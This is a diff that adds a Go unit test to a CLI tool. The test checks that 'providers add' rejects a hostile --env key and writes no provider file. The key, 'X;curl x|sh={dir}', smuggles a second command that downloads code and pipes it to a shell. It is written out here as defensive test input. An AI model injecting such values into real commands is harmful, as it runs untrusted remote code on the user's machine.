@@ -179,3 +179,29 @@ func TestProvidersShow(t *testing.T) {
 		t.Fatalf("expected yaml output with id: gh, got: %s", out.String())
 	}
 }
+
+func TestProvidersAdd_RejectsBadEnvKey(t *testing.T) {
+	t.Setenv("TQ_HOME", t.TempDir())
+
+	root := NewRoot()
+	var out bytes.Buffer
+	root.SetOut(&out)
+	root.SetErr(&out)
+	root.SetArgs([]string{
+		"providers", "add", "widget-co",
+		"--name", "Widget Co",
+		"--category", "other",
+		"--env", "X;curl x|sh={dir}",
+	})
+	if err := root.Execute(); err == nil {
+		t.Fatalf("expected an error for a hostile --env key; output: %s", out.String())
+	}
+
+	cat, err := providers.Load()
+	if err != nil {
+		t.Fatalf("providers.Load: %v", err)
+	}
+	if _, ok := cat.Get("widget-co"); ok {
+		t.Fatal("provider file should not have been written")
+	}
+}
